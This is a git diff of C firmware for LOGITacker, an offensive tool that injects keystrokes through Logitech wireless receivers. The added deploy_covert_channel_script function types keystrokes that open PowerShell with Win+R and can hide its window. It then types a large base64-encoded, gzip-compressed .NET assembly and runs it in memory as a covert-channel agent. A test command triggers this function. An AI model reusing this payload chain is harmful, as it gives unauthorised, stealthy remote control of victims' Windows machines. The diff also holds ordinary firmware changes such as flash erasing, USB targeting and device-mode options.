@@ -1,4 +1,7 @@
 #include "fds.h"
+#include "fds_internal_defs.h"
+#include "nrf_fstorage.h"
+#include "nrf_fstorage_nvmc.h"
 #include "ctype.h"
 #include "logitacker_tx_payload_provider.h"
 #include "logitacker_tx_pay_provider_string_to_keys.h"
@@ -15,6 +18,9 @@
 #include "logitacker_flash.h"
 #include "logitacker_processor_inject.h"
 #include "logitacker_script_engine.h"
+#include "logitacker_processor_covert_channel.h"
+
+//#define CLI_TEST_COMMANDS
 
 static void cmd_devices_remove_all(nrf_cli_t const * p_cli, size_t argc, char **argv);
 static void cmd_script_press(nrf_cli_t const *p_cli, size_t argc, char **argv);
@@ -29,6 +35,35 @@ static char m_device_addr_str_list_first_entry[] = "all\x00";
 #define STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES 32
 static char m_stored_script_names_str_list[STORED_SCRIPTS_AUTOCOMPLETE_LIST_MAX_ENTRIES][LOGITACKER_SCRIPT_ENGINE_SCRIPT_NAME_MAX_LEN];
 static int m_stored_script_names_str_list_len = 0;
+
+void deploy_covert_channel_script(bool hide) {
+    char * agentscript = "$b=\"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\";nal no New-Object -F;$m=no IO.MemoryStream;$a=no byte[] 1024;$gz=(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress));$n=0;do{$n=$gz.Read($a,0,$a.Length);$m.Write($a,0,$n)}while ($n -gt 0);[System.Reflection.Assembly]::Load($m.ToArray());[LogitackerClient.Runner]::Run()\n";
+    //char * agentscript = "Get-Date\n";
+    char chunk[129] = {0};
+
+    logitacker_script_engine_flush_tasks();
+
+    logitacker_script_engine_append_task_press_combo("GUI r");
+    logitacker_script_engine_append_task_delay(500);
+    logitacker_script_engine_append_task_type_string("powershell.exe\n");
+    logitacker_script_engine_append_task_delay(2000);
+
+    if (hide) {
+        logitacker_script_engine_append_task_type_string("$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);");
+        logitacker_script_engine_append_task_type_string("$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName(\"WindowsBase\")).GetType(\"MS.Win32.UnsafeNativeMethods\"))::SetWindowPos($hw,$i,0,0,100,100,16512)\n");
+        logitacker_script_engine_append_task_delay(500);
+    }
+
+    while (strlen(agentscript) >= 128) {
+        memcpy(chunk, agentscript, 128); //keep last byte 0x00
+        logitacker_script_engine_append_task_type_string(chunk);
+        agentscript += 128; //advance pointer
+    }
+    memset(chunk,0,129);
+    memcpy(chunk, agentscript, strlen(agentscript)); //keep last byte 0x00
+    logitacker_script_engine_append_task_type_string(chunk);
+}
+
 
 static void stored_devices_str_list_update() {
     m_stored_device_addr_str_list_len = 1;
@@ -109,7 +144,7 @@ static void dynamic_script_name(size_t idx, nrf_cli_static_entry_t *p_static)
 
     if (idx == 0) stored_script_names_str_list_update();
 
-    NRF_LOG_INFO("script list len %d", m_stored_script_names_str_list_len);
+    //NRF_LOG_INFO("script list len %d", m_stored_script_names_str_list_len);
 
     if (idx >= m_stored_script_names_str_list_len) {
         p_static->p_syntax = NULL;
@@ -132,6 +167,25 @@ static void dynamic_device_addr_list_ram_with_all(size_t idx, nrf_cli_static_ent
         p_static->p_syntax = m_device_addr_str_list[0];
         p_static->handler = cmd_devices_remove_all;
         p_static->p_help = "remove all devices";
+    } else if (idx < m_device_addr_str_list_len) {
+        p_static->p_syntax = m_device_addr_str_list[idx];
+    } else {
+        p_static->p_syntax = NULL;
+    }
+}
+
+static void dynamic_device_addr_list_ram_with_usb(size_t idx, nrf_cli_static_entry_t *p_static)
+{
+    // Must be sorted alphabetically to ensure correct CLI completion.
+    p_static->handler  = NULL;
+    p_static->p_subcmd = NULL;
+    p_static->p_help   = "Connect with address.";
+
+
+    if (idx == 0) {
+        device_address_str_list_update(); // update list if idx 0 is requested
+        memcpy(m_device_addr_str_list[0], "USB\x00", 4);
+        p_static->p_syntax = m_device_addr_str_list[0];
     } else if (idx < m_device_addr_str_list_len) {
         p_static->p_syntax = m_device_addr_str_list[idx];
     } else {
@@ -245,6 +299,9 @@ static void print_logitacker_device_info(nrf_cli_t const * p_cli, const logitack
 
     nrf_cli_fprintf(p_cli, outcol, "\tclass: ");
     switch (p_dongle->classification) {
+        case DONGLE_CLASSIFICATION_IS_LOGITECH_G700:
+            nrf_cli_fprintf(p_cli, outcol, "Logitech G700/G700s");
+            break;
         case DONGLE_CLASSIFICATION_IS_LOGITECH_LIGHTSPEED:
             nrf_cli_fprintf(p_cli, outcol, "Logitech LIGHTSPEED");
             break;
@@ -306,78 +363,6 @@ static void cmd_testled(nrf_cli_t const *p_cli, size_t argc, char **argv) {
 
 static void cmd_test_a(nrf_cli_t const * p_cli, size_t argc, char **argv)
 {
-/*
-    if (argc > 1)
-    {
-        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);
-
-        //parse arg 1 as address
-        uint8_t addr[5];
-        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
-            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
-            return;
-        }
-
-        char tmp_addr_str[16];
-        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
-        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
-
-
-
-        //logitacker_keyboard_map_test();
-        logitacker_enter_mode_injection(addr);
-        logitacker_injection_string(LANGUAGE_LAYOUT_DE, "Hello World!");
-
-        return;
-    } else {
-        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "device address needed, format has to be xx:xx:xx:xx:xx\r\n");
-        return;
-
-    }
-*/
-    logitacker_devices_log_stats();
-
-    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "sizeof(logitacker_devices_unifying_device_rf_address_t)   : %d\r\n", sizeof(logitacker_devices_unifying_device_rf_address_t));
-    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "sizeof(logitacker_devices_unifying_device_rf_addr_base_t) : %d\r\n", sizeof(logitacker_devices_unifying_device_rf_addr_base_t));
-    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "sizeof(logitacker_devices_unifying_device_t)              : %d\r\n", sizeof(logitacker_devices_unifying_device_t));
-    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "sizeof(logitacker_devices_unifying_dongle_t)              : %d\r\n", sizeof(logitacker_devices_unifying_dongle_t));
-
-    logitacker_devices_unifying_device_t * p_device1 = NULL;
-    logitacker_devices_unifying_device_t * p_device2 = NULL;
-    logitacker_devices_unifying_device_t * p_device3 = NULL;
-    logitacker_devices_unifying_device_rf_address_t addr1 = {0x00, 0x01, 0x02, 0x03, 0x04};
-    logitacker_devices_unifying_device_rf_address_t addr2 = {0x01, 0x02, 0x03, 0x04, 0x05};
-    logitacker_devices_unifying_device_rf_address_t addr3 = {0x01, 0x02, 0x03, 0x04, 0x02};
-
-
-    logitacker_devices_create_device(&p_device1, addr1);
-    logitacker_devices_create_device(&p_device2, addr2);
-    logitacker_devices_create_device(&p_device3, addr3);
-
-/*
-    logitacker_flash_store_device(p_device1);
-    logitacker_flash_store_device(p_device2);
-    logitacker_flash_store_device(p_device3);
-*/
-    logitacker_flash_list_stored_devices();
-
-/*
-    logitacker_flash_store_dongle(p_device1->p_dongle);
-    logitacker_flash_store_dongle(p_device2->p_dongle);
-    logitacker_flash_store_dongle(p_device3->p_dongle);
-*/
-    logitacker_flash_list_stored_dongles();
-
-
-
-    logitacker_flash_delete_device(p_device1->rf_address);
-    logitacker_flash_delete_device(p_device2->rf_address);
-    logitacker_flash_delete_device(p_device3->rf_address);
-    logitacker_flash_delete_dongle(p_device1->p_dongle->base_addr);
-    logitacker_flash_delete_dongle(p_device2->p_dongle->base_addr);
-    logitacker_flash_delete_dongle(p_device3->p_dongle->base_addr);
-
-    logitacker_devices_store_dongle_to_flash(p_device2->p_dongle->base_addr);
 
     fds_stat_t fds_stats;
     fds_stat(&fds_stats);
@@ -392,32 +377,62 @@ static void cmd_test_a(nrf_cli_t const * p_cli, size_t argc, char **argv)
     nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "freeable words : %d\r\n", fds_stats.freeable_words);
     nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "corruption     : %s\r\n", fds_stats.corruption ? "true" : "false");
 
-    fds_gc();
+    //fds_gc();
 }
 
-static void cmd_test_b(nrf_cli_t const * p_cli, size_t argc, char **argv) {
 
+static void cmd_test_b(nrf_cli_t const * p_cli, size_t argc, char **argv) {
+        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb report received  : %d\r\n", g_logitacker_global_runtime_state.usb_led_out_report_count);
+        nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "usb script triggered: %s\r\n", g_logitacker_global_runtime_state.usb_inject_script_triggered ? "true" : "false");
+        deploy_covert_channel_script(true);
 }
 
 static void cmd_test_c(nrf_cli_t const * p_cli, size_t argc, char **argv) {
     fds_find_token_t ft;
     memset(&ft, 0x00, sizeof(fds_find_token_t));
     fds_record_desc_t rd;
+
+
+    fds_flash_record_t flash_record;
+
+    char * tmp_str[256] = {0};
+
     while (fds_record_iterate(&rd,&ft) == FDS_SUCCESS) {
-        NRF_LOG_INFO("Deleting record...")
-        fds_record_delete(&rd);
+        uint32_t err;
+        err = fds_record_open(&rd, &flash_record);
+        if (err != FDS_SUCCESS) {
+            NRF_LOG_WARNING("Failed to open record %08x", err);
+            continue; // go on with next
+        }
+
+        sprintf((char *) tmp_str, "Record file_id %04x record_key %04x", flash_record.p_header->file_id, flash_record.p_header->record_key);
+        NRF_LOG_INFO("%s",nrf_log_push((char*) tmp_str));
+
+        if (fds_record_close(&rd) != FDS_SUCCESS) {
+            NRF_LOG_WARNING("Failed to close record");
+        }
+
     }
-    fds_gc();
 }
 #endif
 
 static void cmd_version(nrf_cli_t const * p_cli, size_t argc, char **argv) {
     nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "LOGITacker by MaMe82\r\n");
     nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "Version: %s\r\n", VERSION_STRING);
-
 }
 
+
+void callback_dummy(nrf_fstorage_evt_t * p_evt) {};
+NRF_FSTORAGE_DEF(nrf_fstorage_t m_nfs) =
+        {
+                .evt_handler    = callback_dummy,
+//                .start_addr     = 0xFD000,
+//                .end_addr       = 0xFFFFF,
+        };
+static bool nfs_initiated = false;
+
 static void cmd_erase_flash(nrf_cli_t const * p_cli, size_t argc, char **argv) {
+/*
     fds_find_token_t ft;
     memset(&ft, 0x00, sizeof(fds_find_token_t));
     fds_record_desc_t rd;
@@ -426,6 +441,38 @@ static void cmd_erase_flash(nrf_cli_t const * p_cli, size_t argc, char **argv) {
         fds_record_delete(&rd);
     }
     fds_gc();
+    fds_stat_t stats;
+    fds_stat(&stats);
+*/
+
+    uint32_t flash_size  = (FDS_PHY_PAGES * FDS_PHY_PAGE_SIZE * sizeof(uint32_t));
+    uint32_t end_addr   = helper_flash_end_addr();
+    uint32_t start_addr = end_addr - flash_size;
+
+    m_nfs.start_addr = start_addr;
+    m_nfs.end_addr = end_addr;
+
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Erasing flash from start addr: %x, pages: %d\n", start_addr, FDS_PHY_PAGES);
+
+/*
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Freeable words:  %d\n", stats.freeable_words);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Largest contig:  %d\n", stats.largest_contig);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words used:      %d\n", stats.words_used);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Words reserved:  %d\n", stats.words_reserved);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Dirty records:   %d\n", stats.dirty_records);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Valid records:   %d\n", stats.valid_records);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Open records:    %d\n", stats.open_records);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Pages available: %d\n", stats.pages_available);
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_YELLOW, "Corruption:      %s\n", stats.corruption ? "yes" : "no");
+*/
+
+    if (!nfs_initiated) {
+        if (nrf_fstorage_init(&m_nfs, &nrf_fstorage_nvmc, NULL) == NRF_SUCCESS) nfs_initiated = true;
+    }
+    if (nfs_initiated) nrf_fstorage_erase(&m_nfs, start_addr, FDS_PHY_PAGES, NULL);
+
+    nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_RED, "... page erase issued, wait some seconds and re-plug the dongle\n");
 }
 
 static void cmd_inject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
@@ -434,22 +481,27 @@ static void cmd_inject(nrf_cli_t const * p_cli, size_t argc, char **argv) {
 
 static void cmd_inject_target(nrf_cli_t const * p_cli, size_t argc, char **argv)
 {
+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "inject target %s\r\n", argv[1]);
+
     if (argc > 1)
     {
-        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);
+        //nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_DEFAULT, "parameter count %d\r\n", argc);
 
         //parse arg 1 as address
         uint8_t addr[5];
-        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
-            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
-            return;
+        if (strcmp(argv[1], "USB") == 0) {
+            memset(addr,0x00,5);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes to USB keyboard interface\r\n");
+        } else {
+            if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
+                nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
+                return;
+            }
+
+            char tmp_addr_str[16];
+            helper_addr_to_hex_str(tmp_addr_str, 5, addr);
+            nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
         }
-
-        char tmp_addr_str[16];
-        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
-        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Trying to send keystrokes using address %s\r\n", tmp_addr_str);
-
-
 
         //logitacker_keyboard_map_test();
         logitacker_enter_mode_injection(addr);
@@ -467,10 +519,10 @@ static void cmd_script_store(nrf_cli_t const *p_cli, size_t argc, char **argv)
     if (argc == 2)
     {
         if (logitacker_script_engine_store_current_script_to_flash(argv[1])) {
-            NRF_LOG_INFO("storing script succeeded");
+            //NRF_LOG_INFO("storing script succeeded");
             return;
         }
-        NRF_LOG_INFO("Storing script failed");
+        //NRF_LOG_INFO("Storing script failed");
         return;
     } else {
         nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "store needs a scriptname as first argument\r\n");
@@ -579,6 +631,31 @@ static void cmd_option_global_workmode_unifying(nrf_cli_t const *p_cli, size_t a
 static void cmd_option_global_workmode_lightspeed(nrf_cli_t const *p_cli, size_t argc, char **argv) {
     g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_LIGHTSPEED;
     nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to LIGHTSPEED compatible\r\n");
+}
+
+static void cmd_option_global_workmode_g700(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    g_logitacker_global_config.workmode = OPTION_LOGITACKER_WORKMODE_G700;
+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "working mode set to G700/G700s compatible\r\n");
+}
+
+static void cmd_option_global_bootmode_discover(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_DISCOVER;
+    nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "boot mode set to 'discover'\r\n");
+}
+
+static void cmd_option_global_bootmode_usbinject(nrf_cli_t const *p_cli, size_t argc, char **argv) {
+    g_logitacker_global_config.bootmode = OPTION_LOGITACKER_BOOTMODE_USB_INJECT;
